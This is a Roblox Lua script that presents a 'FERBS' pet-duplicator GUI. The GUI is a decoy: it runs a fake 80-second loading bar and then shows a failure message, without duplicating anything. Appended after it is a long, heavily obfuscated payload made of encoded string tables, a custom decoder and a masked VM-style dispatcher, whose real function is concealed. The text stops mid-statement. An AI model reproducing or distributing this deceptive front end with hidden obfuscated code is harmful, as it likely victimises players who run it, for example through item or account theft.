local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FerbsDuplicatorMobile"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Mobile detection
local isMobile = game:GetService("UserInputService").TouchEnabled
local textSizeMultiplier = isMobile and 1.3 or 1

--= BLACK THEME =--
local function applyDarkTheme(frame)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    frame.BackgroundTransparency = 0.1
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    })
    gradient.Rotation = 90
    gradient.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    return frame
end

--= MAIN FRAME (Responsive Sizing) =--
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = isMobile and UDim2.new(0.9, 0, 0, 350) or UDim2.new(0, 450, 0, 300)
mainFrame.Position = isMobile and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -225, 0.5, -150)
mainFrame.AnchorPoint = isMobile and Vector2.new(0.5, 0.5) or Vector2.new(0, 0)
mainFrame = applyDarkTheme(mainFrame)
mainFrame.Parent = gui

--= FERBS WATERMARK (Mobile Optimized) =--
local ferbsWatermark = Instance.new("TextLabel")
ferbsWatermark.Name = "FerbsWatermark"
ferbsWatermark.Size = UDim2.new(0, 200 * (isMobile and 1.2 or 1), 0, 50 * (isMobile and 1.2 or 1))
ferbsWatermark.Position = UDim2.new(0.5, -100 * (isMobile and 1.2 or 1), 0.9, 0)
ferbsWatermark.Text = "FERBS"
ferbsWatermark.TextColor3 = Color3.fromRGB(0, 255, 255)
ferbsWatermark.BackgroundTransparency = 1
ferbsWatermark.Font = Enum.Font.GothamBlack
ferbsWatermark.TextSize = 28 * textSizeMultiplier
ferbsWatermark.TextStrokeTransparency = 0.5
ferbsWatermark.TextStrokeColor3 = Color3.fromRGB(0, 150, 150)
ferbsWatermark.ZIndex = 100
ferbsWatermark.Parent = gui

-- Wave animation
spawn(function()
    while true do
        for i = 0, 1, 0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
        for i = 1, 0, -0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
    end
end)

--= FLOATING FERBS TEXTS (Mobile Adjusted) =--
for i = 1, (isMobile and 5 or 8) do
    local floatingFerbs = Instance.new("TextLabel")
    floatingFerbs.Name = "FloatingFerbs_"..i
    floatingFerbs.Size = UDim2.new(0, (80 + math.random(-20,20)) * (isMobile and 1.2 or 1), 0, 30 * (isMobile and 1.2 or 1))
    floatingFerbs.Position = UDim2.new(math.random(), -40 * (isMobile and 1.2 or 1), math.random(0.1,0.8), -15 * (isMobile and 1.2 or 1))
    floatingFerbs.Text = "FERBS"
    floatingFerbs.TextColor3 = Color3.fromRGB(
        100 + math.random(0,155),
        100 + math.random(0,155),
        255
    )
    floatingFerbs.BackgroundTransparency = 1
    floatingFerbs.Font = Enum.Font.GothamBold
    floatingFerbs.TextSize = (14 + math.random(-2,4)) * textSizeMultiplier
    floatingFerbs.TextTransparency = 0.7
    floatingFerbs.ZIndex = 50
    floatingFerbs.Parent = gui
    
    spawn(function()
        local speed = 0.5 + math.random()
        local offset = math.random(1,10)
        while true do
            floatingFerbs.Position = UDim2.new(
                floatingFerbs.Position.X.Scale,
                floatingFerbs.Position.X.Offset,
                0.1 + (math.sin(tick()*speed + offset) * 0.1),
                floatingFerbs.Position.Y.Offset
            )
            floatingFerbs.TextTransparency = 0.5 + (math.sin(tick()*2 + i) * 0.3)
            task.wait()
        end
    end)
end

--= DUPLICATE BUTTON (Mobile Friendly) =--
local duplicateButton = Instance.new("TextButton")
duplicateButton.Name = "DuplicateButton"
duplicateButton.Size = UDim2.new(0.8, 0, 0, isMobile and 70 or 60)
duplicateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
duplicateButton.Text = "DUPLICATE PET"
duplicateButton.TextColor3 = Color3.new(1, 1, 1)
duplicateButton.Font = Enum.Font.GothamBlack
duplicateButton.TextSize = 20 * textSizeMultiplier
duplicateButton.AutoButtonColor = false
duplicateButton.Parent = mainFrame

-- Button styling
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = duplicateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 3
buttonStroke.Color = Color3.fromRGB(0, 200, 200)
buttonStroke.Parent = duplicateButton

-- Button gradient
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = duplicateButton

-- Touch support for mobile
if isMobile then
    local touchButtonEffect = Instance.new("Frame")
    touchButtonEffect.Name = "TouchEffect"
    touchButtonEffect.Size = UDim2.new(1, 0, 1, 0)
    touchButtonEffect.BackgroundColor3 = Color3.new(1, 1, 1)
    touchButtonEffect.BackgroundTransparency = 0.9
    touchButtonEffect.ZIndex = 10
    touchButtonEffect.Visible = false
    touchButtonEffect.Parent = duplicateButton
    
    duplicateButton.TouchTap:Connect(function()
        touchButtonEffect.Visible = true
        game:GetService("TweenService"):Create(
            touchButtonEffect,
            TweenInfo.new(0.3),
            {BackgroundTransparency = 1}
        ):Play()
        task.wait(0.3)
        touchButtonEffect.Visible = false
    end)
end

-- Button hover effects (desktop only)
if not isMobile then
    duplicateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 255, 255)}
        ):Play()
    end)

    duplicateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 200, 200)}
        ):Play()
    end)
end

--= FULLSCREEN LOADING SCREEN (Mobile Optimized) =--
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
loadingFrame.BackgroundTransparency = 0.05
loadingFrame.Visible = false
loadingFrame.ZIndex = 100
loadingFrame.Parent = gui

-- Loading text (mobile responsive)
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = isMobile and UDim2.new(0.9, 0, 0, 250) or UDim2.new(0.8, 0, 0, 150)
loadingText.Position = isMobile and UDim2.new(0.05, 0, 0.2, 0) or UDim2.new(0.1, 0, 0.3, 0)
loadingText.Text = "🔍 Searching for low-pop server...\n\n• Works on: Dragonfly, Queen Bee, Disco Bee, Red Fox, Raccoon, Butterfly\n• Doesn't work on fruits or low-tier pets\n\nPlease wait while we find the best server..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16 * textSizeMultiplier
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextYAlignment = Enum.TextYAlignment.Top
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame

-- Loading bar (thicker on mobile)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = isMobile and UDim2.new(0.9, 0, 0, 20) or UDim2.new(0.8, 0, 0, 15)
loadingBar.Position = isMobile and UDim2.new(0.05, 0, 0.6, 0) or UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
loadingBar.Parent = loadingFrame

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
loadingBarFill.Parent = loadingBar

-- Loading percentage (bigger on mobile)
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0, 100 * (isMobile and 1.3 or 1), 0, 40 * (isMobile and 1.3 or 1))
percentText.Position = UDim2.new(0.5, -50 * (isMobile and 1.3 or 1), 0.5, -20 * (isMobile and 1.3 or 1))
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.Font = Enum.Font.GothamBlack
percentText.TextSize = 30 * textSizeMultiplier
percentText.BackgroundTransparency = 1
percentText.Parent = loadingFrame

--= DUPLICATE FUNCTION (Mobile Compatible) =--
local function startDuplication()
    loadingFrame.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 80
    local startTime = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - startTime) / duration, 1)
        
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            connection:Disconnect()
            
            -- Success message (mobile responsive)
            local successText = Instance.new("TextLabel")
            successText.Text = "❌ Please make sure you followed all the requirements, or there might be a connection issue"
            successText.Size = isMobile and UDim2.new(0.9, 0, 0, 80) or UDim2.new(0.8, 0, 0, 50)
            successText.Position = isMobile and UDim2.new(0.05, 0, 0.7, 0) or UDim2.new(0.1, 0, 0.7, 0)
            successText.TextColor3 = Color3.fromRGB(0, 255, 0)
            successText.Font = Enum.Font.GothamBlack
            successText.TextSize = 22 * textSizeMultiplier
            successText.BackgroundTransparency = 0.8
            successText.TextWrapped = true
            successText.Parent = loadingFrame
            
            task.wait(10)
            loadingFrame.Visible = false
            successText:Destroy()
        end
    end)
end

-- Connect both mouse and touch inputs
duplicateButton.MouseButton1Click:Connect(startDuplication)
if isMobile then
    duplicateButton.TouchTap:Connect(startDuplication)
end

return(function(...)local l={"\107\057\048\109\075\072\051\087\107\108\104\109\116\057\090\052\078\050\112\061";"\073\109\068\061";"\115\050\081\071\073\052\068\061","\078\109\104\057\115\104\101\052\119\104\057\065\088\079\115\109\073\083\061\061";"\115\109\115\051\073\050\076\102\107\043\057\109\116\109\082\079";"\078\050\122\079\088\050\077\068\078\043\104\067\112\100\072\097\073\113\061\061";"\083\122\082\118\116\072\104\115\115\072\122\082\112\087\061\061","\075\074\118\100\107\072\078\077\078\101\061\061","\107\050\057\051\073\052\115\077","\078\122\077\066\069\100\057\112\106\116\082\097\078\122\115\072","\073\116\104\100\088\101\061\061","\055\080\082\070\054\043\112\100\115\072\076\082\106\074\067\090","\057\050\083\052\069\053\077\103\057\052\077\070\054\104\057\069\116\113\061\061","","\073\066\083\122";"\090\057\118\079\121\081\080\103\068\100\089\103\102\050\114\078\115\109\116\051\086\072\110\108\074\071\113\043\043\100\077\106\081\121\113\078\099\109\065\089\048\109\048\053\075\079\109\070\053\113\067\104\053\097\104\048\109\072\120\066\118\065\055\098\067\043\120\112\098\121\120\077\119\065\067\122\105\065\122\116\057\083\043\056\104\116\090\110\054\067\052\113\098\056\088\110\116\082\097\112\072\110\112\103\119\075\078\069\075\111\098\061","\112\104\072\061","\078\053\104\121\073\053\069\061";"\057\057\067\112","\057\108\057\121\088\053\120\071\088\087\061\061";"\073\053\120\082\115\074\054\100\107\050\077\084\115\087\061\061","\111\050\049\114\106\077\069\102\107\050\077\057\107\079\054\104";"\078\116\076\087\055\116\054\065","\115\108\104\051\115\083\061\061";"\055\108\120\084\055\108\104\100","\073\109\072\061";"\107\108\067\070\116\079\048\076\055\052\048\056\107\109\118\053","\111\077\054\084\088\079\049\103\107\053\118\053\107\100\082\065\088\116\055\061","\115\108\122\082\078\053\054\090";"\115\080\067\097\073\052\068\061";"\119\121\113\077\115\114\090\049\119\113\061\061","\107\052\118\097\088\116\076\079","\075\072\120\079\069\122\115\084\106\043\048\098\055\080\054\067\083\087\061\061","\055\108\082\082\107\113\061\061";"\107\050\104\084\115\053\120\051";"\107\053\054\082\073\053\087\061","\115\052\054\122\055\113\061\061","\078\053\104\047\088\087\061\061","\120\089\099\083\065\117\043\081\073\057\112\114\067\114\071\043\102\052\082\097\074\053\121\078\115\056\098\078\102\049\116\098\054\110\067\090\085\101\109\057\052\089\087\061","\107\108\057\100\073\116\057\100\055\080\118\082\055\050\081\077";"\090\048\077\056\104\080\054\085\077\111\109\097\043\082\108\050\087\048\049\089\080\097\122\054\118\069\113\065\074\118\087\088\055\104\105\077\088\072\066\090\084\111\113\070\102\114\068\073\106\073\050\051\057\099\098\114\075\103\113\115\086\083\100\115\049\098\078\104\083\102\052\065\100\070\122\114\053\116\049\049\112\068\055\048\054\107\043\081\071\069\089\084\065\081\103\053\051\117\074\047\043\049\074\089\101\103\111\119","\080\122\120\098\115\116\102\061";"\054\079\054\048\069\113\061\061","\073\116\111\110\065\119\054\079\049\107\105\048\049\108\071\112\107\121\053\077\071\047\104\084\120\113\068\054\081\120\112\068\056\107\049\119\108\106\056\071\111\070\072\048\114\077\071\112\068\089\080\115\068\082\081\076\076\074\106\075\057\048\084\075\065\089\097\106\103\089\066\068\114\069\088\049\051\069\054\050\099\109\079\076\080\119\104\104\120\107\075\106\117\054\121\122\086\048\104\084\087\065\110\052\056\115\076\068\102\109\069\061","\057\053\104\051\107\053\057\097\068\072\118\077\078\053\057\043\078\053\057\066\068\083\061\061","\078\053\120\047\078\074\067\049\073\050\107\061","\080\122\120\049\073\050\118\077\106\101\061\061","\080\122\120\079\055\087\061\061";"\119\113\061\061";"\078\053\120\084\078\116\122\121\115\080\068\061";"\112\048\086\054\072\056\104\110\116\097\068\082\099\087\061\061","\080\122\120\051\115\080\118\082\078\053\104\121\073\053\069\061","\111\080\115\069\078\057\104\082\055\043\048\051\054\100\082\116\078\113\061\061","\057\049\047\051\057\113\107\061";"\057\080\054\077\107\050\076\082\073\116\069\061";"\073\053\057\084";"\055\079\077\100\115\083\061\061"}for W,d in ipairs({{-666613+666614,121060+-121003};{848762+-848761;887063-887035};{-926624-(-926653);978103-978046}})do while d[939709+-939708]<d[771832+-771830]do l[d[319466+-319465]],l[d[760570-760568]],d[436974+-436973],d[715768-715766]=l[d[649780+-649778]],l[d[978622+-978621]],d[-308457-(-308458)]+(-686837+686838),d[-320362+320364]-(375340+-375339)end end local function W(W)return l[W-(-872827+898810)]end do local W={o=114103-114084,["\051"]=-721206+721251,T=46433+-46387;x=-859582-(-859643);["\053"]=-491177-(-491183),R=-892827-(-892860),k=-923197+923225,j=-585684-(-585714),E=-494703+494723,["\056"]=117006-116964;e=422317-422317,G=334314+-334267,z=635817-635764;["\052"]=358946-358891;Y=-425378-(-425389);m=-245544+245547,I=487562-487535;u=-65698+65757,s=903932+-903907;["\043"]=385103-385068,B=-765944+765980;["\054"]=-569125-(-569138),Z=663709-663669,l=78946+-78892,F=-89257-(-89315);i=295589-295529,M=425005+-424968,H=-838390-(-838394);N=616912-616883,n=-129557-(-129572),v=411245+-411228;["\057"]=-819620-(-819641),q=-55106-(-55138);X=31675-31649;U=849497-849466,J=-46810-(-46817),r=233129-233127,["\048"]=-912635-(-912636),["\047"]=654311-654260;S=750663-750647,A=584114+-584071,f=556273+-556217,P=589490+-589467,g=-90713-(-90723);O=-103651+103690;Q=93012-92963,a=224281-224231;D=805761-805753,p=-246492-(-246504);h=958974+-958969,t=20641+-20619;V=-383724+383787,K=157687-157669,b=432557+-432513;L=-30561+30618;C=539505+-539496;["\050"]=1017472+-1017434;c=-348523+348585;y=-181444-(-181478),["\055"]=353067+-353043,d=281437-281385;W=254936-254888;["\049"]=698399-698358,w=564273+-564259}local d=table.concat local B=type local F=string.sub local g=table.insert local V=l local L=string.len local A=math.floor local C=string.char for l=-469615+469616,#V,471215+-471214 do local s=V[l]if B(s)=="\115\116\114\105\110\103"then local B=L(s)local J={}local n=607092-607091 local p=-488367-(-488367)local G=-469167-(-469167)while n<=B do local l=F(s,n,n)local d=W[l]if d then p=p+d*(157349+-157285)^((337066+-337063)-G)G=G+(-391532+391533)if G==755831+-755827 then G=171557-171557 local l=A(p/(-277865+343401))local W=A((p%(1025598-960062))/(-234343+234599))local d=p%(-706166+706422)g(J,C(l,W,d))p=786296+-786296 end elseif l=="\061"then g(J,C(A(p/(-166695-(-232231)))))if n>=B or F(s,n+(649525-649524),n+(-756214-(-756215)))~="\061"then g(J,C(A((p%(-227431+292967))/(501552+-501296))))end break end n=n+(960574+-960573)end V[l]=d(J)end end end return(function(l,B,F,g,V,L,A,s,G,x,n,J,d,R,a,Z,p,C,v)s,v,C,p,a,n,x,R,G,J,Z,d={},function(l,W)local B=p(W)local F=function(F,g)return d(l,{F;g},W,B)end return F end,{},function(l)for W=35937+-35936,#l,-688820-(-688821)do s[l[W]]=s[l[W]]+(-564721-(-564722))end if F then local d=F(true)local B=V(d)B[W(734407-708406)],B[W(418093+-392091)],B[W(-362987+388983)]=l,G,function()return 4130527-956158 end return d else return g({},{[W(131940+-105938)]=G,[W(313258+-287257)]=l,[W(142768-116772)]=function()return 2251172-(-923197)end})end end,function(l,W)local B=p(W)local F=function(...)return d(l,{...},W,B)end return F end,-835898+835898,function(l,W)local B=p(W)local F=function(F,g,V,L)return d(l,{F,g,V;L},W,B)end return F end,function(l)s[l]=s[l]-(-962430+962431)if s[l]==-645428-(-645428)then s[l],C[l]=nil,nil end end,function(l)local W,d=241063+-241062,l[-35489+35490]while d do s[d],W=s[d]-(896317-896316),(-28832-(-28833))+W if s[d]==977406-977406 then s[d],C[d]=nil,nil end d=l[W]end end,function()n=n+(264681-264680)s[n]=958078+-958077 return n end,function(l,W)local B=p(W)local F=function(F)return d(l,{F},W,B)end return F end,function(d,F,g,V)local P,a,t,j,K,I,z,b,u,c,H,A,m,Q,O,M,r,D,T,X,w,n,U,Y,h,E,e,k,i,q,s,y,G,p while d do if d<7382838-34593 then if d<4245974-685429 then if d<-126372+2355629 then if d<358315+887439 then if d<957968-304937 then if d<860091+-209251 then if d<79718-(-299497)then P=R(P)T=R(T)q=R(q)y=R(y)m=R(m)i=R(i)d=3549325-863803 O=nil else C[n]=e d=C[n]d=d and 12424091-883259 or-268200+10667237 end else r=W(987227-961214)d=l[r]r=W(785144+-759107)l[r]=d d=6664043-(-350059)end else if d<739895+260842 then E=C[n]e=E d=E and 702390+5811473 or 691189+-52194 else U=-362795+362797 d=14333910-(-224743)b=O[U]U=C[i]D=b==U w=D end end else if d<-299881+2343430 then if d<-932925+2816318 then if d<1723502-(-28257)then d=C[g[-1029695-(-1029696)]]H=-8608-(-8608)Q=-1045057-(-1045312)n=p M=d(H,Q)d=5814098-600755 s[n]=M n=nil else p=-610483+610687 n=C[g[-294118-(-294121)]]s=n*p n=-575153-(-575410)d=-367147+14962153 A=s%n C[g[-573618+573621]]=A end else n=C[g[206822+-206820]]p=C[g[-790585+790588]]s=n==p A=s d=4034332-923325 end else if d<1622438-(-504496)then t=t+u c=not j H=t<=Q H=c and H c=t>=Q c=j and c H=c or H c=-346667+13836231 d=H and c H=16120013-1029888 d=d or H else r=249064+-249064 k=#c d=-21217+14818981 Y=k==r end end end else if d<575154+2188375 then if d<-99427+2516381 then if d<1569253-(-839226)then if d<1559893-(-693557)then D=-718389-(-718390)h=O[D]w=h d=571250+11345402 else k=#c r=177253+-177253 Y=k==r d=Y and 6186140-103907 or-624179+15421943 end else U=-843642+843643 h=d b=O[U]U=false D=b==U d=D and 952254+267879 or 923517+13635136 w=D end else if d<418029+2186271 then n=C[g[-726391+726393]]p=-201017-(-201190)s=n*p n=368043+33641357630646 A=s+n s=-184806+35184372273638 d=A%s C[g[-157669+157671]]=d s=C[g[841914+-841911]]d=-486575+2341607 n=924221+-924220 A=s~=n else T=not r e=e+z A=e<=E A=T and A T=e>=E T=r and T A=T or A T=2568942-(-304489)d=A and T A=-274024+932476 d=d or A end end else if d<76194+2862071 then if d<433325+2427868 then s=F M=W(197734+-171744)n=J()a=J()d=true G=J()p=W(-1033536+1059522)C[n]=d A=l[p]p=W(1037879-1011839)d=A[p]H=v(8042518-438574,{a})p=J()C[p]=d d=Z(12535583-690613,{})C[G]=d d=false C[a]=d I=l[M]M=I(H)d=M and 318186+11129460 or-622707+11384764 A=M else q=-594830-(-594930)K=-585586-(-585586)m=178661-178406 T=J()y=W(267917-241895)C[T]=e A=l[y]y=W(-958654+984643)d=A[y]y=1020928+-1020927 A=d(y,q)y=J()i=412398-412397 C[y]=A q=-465198-(-465198)O=151461+-151459 d=C[M]A=d(q,m)q=J()C[q]=A D=W(-716470+742470)m=-200165-(-200166)d=C[M]P=C[y]A=d(m,P)m=J()C[m]=A X=-848043-(-858043)A=C[M]P=A(i,O)A=-673268-(-673269)d=P==A A=W(-937149-(-963134))P=J()C[P]=d h=l[D]b=C[M]O=W(-512670-(-538673))U={b(K,X)}D=h(B(U))h=W(-709412-(-735415))w=D..h d=W(-612403+638394)i=O..w O=W(-161440-(-187430))d=Y[d]d=d(Y,A,i)i=J()C[i]=d w=x(47905+16724703,{M,T;t,p,n,k,P,i,y,m,q,Q})A=l[O]O={A(w)}d={B(O)}O=d d=C[P]d=d and 88995+3977945 or 5641547-(-699254)end else if d<4347638-1009087 then d=A and 982334+8066006 or 15693823-(-275945)else d=5855442-(-450030)end end end end else if d<-700918+5915300 then if d<4803522-507440 then if d<3639339-(-516144)then if d<-827770+4885427 then if d<4261447-360875 then d=true d=d and 539313+10721447 or-722678+15301811 else n=W(-508293-(-534321))p=5085244-958398 A=426285-399660 s=n^p d=A-s A=W(500113-474095)s=d d=A/s A={d}d=l[W(-1004873-(-1030912))]end else w=C[n]d=w and 1521229-(-892412)or 4485736-202214 A=w end else if d<3284809-(-991359)then d=true d=d and 1012607+15421047 or 938109+7235196 else d=65634+101795 C[n]=A end end else if d<771896+3958207 then if d<-437742+5084318 then d={}p=C[g[196463-196454]]n=-849786+849787 G=p p=108899+-108898 a=p s=d p=312874+-312874 d=4878005-(-335338)I=a<p p=n-a else p=W(-409152-(-435181))n=l[p]p=W(-364616-(-390636))s=n[p]p=C[g[806073+-806072]]n={s(p)}A={B(n)}d=l[W(135498-109475)]end else if d<266792+4834649 then A={n}d=l[W(-572594+598581)]else M=not I p=p+a n=p<=G n=M and n M=p>=G M=I and M n=M or n M=-888252+2137058 d=n and M n=10310683-868091 d=d or n end end end else if d<682549+5656633 then if d<761464+5249536 then if d<989247+4850692 then if d<6347329-602419 then A=W(-803741-(-829754))s=W(-7788-(-33825))d=l[A]A=l[s]s=W(689909+-663872)l[s]=d d=6689004-383532 s=W(-238375+264388)l[s]=A s=C[g[-946620-(-946621)]]n=s()else k=k+T q=not y Y=k<=r Y=q and Y q=k>=r q=y and q Y=q or Y q=-305769+10506144 d=Y and q Y=-265128+2491884 d=d or Y end else p=1969052-(-278697)n=W(690050-664053)s=n^p A=12125715-794297 d=A-s s=d A=W(380844+-354818)d=A/s A={d}d=l[W(746007-719990)]end else if d<685493+5619959 then P=W(-104211-(-130212))M=nil H=nil D=nil k=J()I=nil r=Z(-61090+7439747,{k;Q;t;a})T=J()Y={}p=nil C[k]=Y c=nil y=W(-615859+641853)q={}u=nil Y=J()I=W(-947574-(-973566))O=W(878608-852602)C[Y]=r r={}C[T]=r r=l[y]i=C[T]d=l[W(787768+-761761)]m={[P]=i;[O]=D}y=r(q,m)r=v(13933258-17697,{T,k,j;Q;t,Y})a=R(a)C[n]=y k=R(k)t=R(t)Q=R(Q)u=-220967+22660939231639 C[G]=r Y=R(Y)a=l[I]t=W(754063-728055)j=R(j)A={}T=R(T)M=C[n]H=C[G]Q=H(t,u)I=M[Q]p=a[I]I=x(-426413+9817804,{n;G})t=-1033536+21419656614700 H=W(335039-309034)a=p(I)a=C[n]Q=13208500696923-(-571570)I=C[G]M=I(H,Q)p=a[M]k=W(-636724+662751)a=W(198886+-172877)l[a]=p I=C[n]Q=W(-748847-(-774840))M=C[G]H=M(Q,t)a=I[H]I=W(341867+-315836)l[I]=a t=W(-553060-(-579058))M=C[n]H=C[G]u=9200099703353-(-1009471)Q=H(t,u)t=W(-300713+326748)I=M[Q]H=W(-305786-(-331818))M=W(448475-422445)l[M]=I M=l[H]Q=l[t]j=C[n]c=C[G]G=R(G)r=13134410399131-(-422445)Y=c(k,r)u=j[Y]n=R(n)j=W(364429-338410)j=Q[j]t={j(Q,u)}H=M(B(t))M=H()else d=true d=d and-447854+5819410 or-1041344+8173210 end end else if d<6146743-(-527984)then if d<6832629-413549 then h=C[n]w=h d=h and-816249+3047101 or 12670563-753911 else E=u==j d=651379-12384 e=E end else if d<6142321-(-936509)then d=894844+3358470 else d=l[W(-787604-(-813625))]A={}end end end end end else if d<12923637-1009535 then if d<597299+9704237 then if d<120548+8481235 then if d<8696238-966398 then if d<-786296+8386291 then if d<6765550-(-777784)then s=C[g[449774+-449773]]A=#s s=-577522+577522 d=A==s d=d and 893244+1526029 or 4033434-(-637172)else d=-435501+8565285 c=W(319018+-292989)j=l[c]c=W(-931340-(-957374))u=j[c]Q=u end else d=true A={}C[g[855932-855931]]=d d=l[W(-125284+151322)]end else if d<654964+7512976 then A=Q d=t d=Q and 1010495+13998219 or 16097292-992319 else d=l[W(160772-134756)]A={}end end else if d<203238+9193363 then if d<439918+8759234 then A=W(-683829+709833)d=l[A]Q=x(876027+3139199,{})H=W(791038-765048)G=W(284265+-258265)s=C[g[527028-527024]]p=l[G]M=l[H]H={M(Q)}M=914556+-914554 I={B(H)}a=I[M]G=p(a)p=W(-502192+528177)n=s(G,p)s={n()}A=d(B(s))s=A n=C[g[-334309-(-334314)]]d=n and 10225944-(-702006)or 989311+14656351 A=n else n=W(525346-499311)A=W(1031919-1005887)d=l[A]s=l[n]H=10325415467088-(-1019200)G=C[g[179622+-179621]]a=C[g[672055-672053]]M=W(556539-530544)I=a(M,H)p=G[I]G=W(-225511+251530)G=s[G]n={G(s,p)}A=d(B(n))d=A()A={}d=l[W(-939773+965806)]end else if d<9362231-(-781624)then d=C[g[-299305+299315]]n=C[g[-59938+59949]]s[d]=n d=C[g[-563441+563453]]n={d(s)}d=l[W(-626611+652626)]A={B(n)}else Y=k q=Y c[Y]=q d=673525+5110203 Y=nil end end end else if d<11585773-165349 then if d<-61474+10948937 then if d<10037337-(-704502)then if d<276329+10098488 then s=W(134564+-108580)d=l[s]n=C[g[383988-383980]]p=-556273-(-556273)s=d(n,p)d=4628653-122916 else d=true d=476399+14102734 end else M=W(-463049-(-489071))I=A A=l[M]M=W(318382-292393)d=A[M]j=W(-852686-(-878715))M=J()C[M]=d H=W(-828685-(-854714))A=l[H]H=W(-985035-(-1011071))d=A[H]u=l[j]Q=u t=d H=d d=u and 934461+6658219 or 8811757-681973 end else if d<10856341-(-396396)then p=C[g[405619-405613]]n=p==s d=15333748-(-311914)A=n else d=5128445-875131 end end else if d<12607466-985343 then if d<-249768+11724636 then I=C[a]A=I d=11728263-966206 else d=333482+13029614 end else if d<191142+11654911 then s=W(-353579+379578)A=W(161893+-135909)d=l[A]A=d(s)d=l[W(-117832-(-143844))]A={}else a=-834298+35184372923130 d={}C[g[-186854+186856]]=d t=-953917-(-953918)u=t H=W(-558577+584563)A=C[g[-928954-(-928957)]]G=A A=n%a M=687668-687413 C[g[360751-360747]]=A I=n%M M=550835-550833 a=I+M C[g[-227234-(-227239)]]=a M=l[H]H=W(-411604-(-437614))I=M[H]M=I(s)t=548913+-548913 Q=M I=W(-99643-(-125668))H=1034368+-1034367 p[n]=I I=-505749-(-505904)d=609267+1484877 j=u<t t=H-u end end end end else if d<14360204-(-434285)then if d<766392+13702373 then if d<-155429+13668966 then if d<-510512+13997772 then if d<12127891-(-852218)then C[n]=w U=C[m]K=-690869+690870 b=U+K D=O[b]h=u+D D=-800505+800761 d=h%D u=d b=C[q]D=j+b b=493103-492847 h=D%b d=349291+-181862 j=h else M=R(M)H=nil p=R(p)p=nil H=W(901308+-875279)Q=R(Q)a=R(a)k=R(k)u=nil u={}j=nil G=R(G)G=J()I=nil t=R(t)c=nil t=J()Y=nil n=R(n)M=W(502192+-476170)n=nil C[G]=n Y=-694390+694391 I=W(558385+-532363)n=J()C[n]=p a=l[I]I=W(341611+-315597)p=a[I]j=J()d=904252+4879476 a=J()Q=W(923774-897788)k=-136932+137188 C[a]=p I=l[M]M=W(547957-521968)p=I[M]M=l[H]c={}H=W(243595-217575)I=M[H]H=l[Q]Q=W(349291+-323303)M=H[Q]r=k Q=J()H=-538609-(-538609)C[Q]=H k=604596-604595 H=-18401+18403 C[t]=H H={}C[j]=u T=k u=21409-21409 k=-367147-(-367147)y=T<k k=Y-T end else z=W(547762-521776)H=t E=l[z]z=W(-208332-(-234343))e=E[z]E=e(s,H)e=C[g[221933-221927]]z=e()k=E+z Y=k+I k=221287-221031 c=Y%k k=p[n]z=-680693+680694 I=c E=I+z H=nil d=471727+1622417 e=G[E]Y=k..e p[n]=Y end else if d<13872261-130916 then z=W(-737896-(-763896))T=W(-532144+558181)d=l[z]r=l[T]z=d(r)d=W(284841+-258828)l[d]=z d=7678603-664501 else d=C[g[915068+-915067]]n=F[954558+-954556]p=d s=F[-672501+672502]d=p[n]d=d and 14688481-(-96483)or-511600+12366810 end end else if d<13969820-(-623475)then if d<762616+13811853 then d=h A=w d=4312163-28641 else d=Z(323050+3065469,{G})E={d()}A={B(E)}d=l[W(-887676+913700)]end else if d<-764280+15381078 then 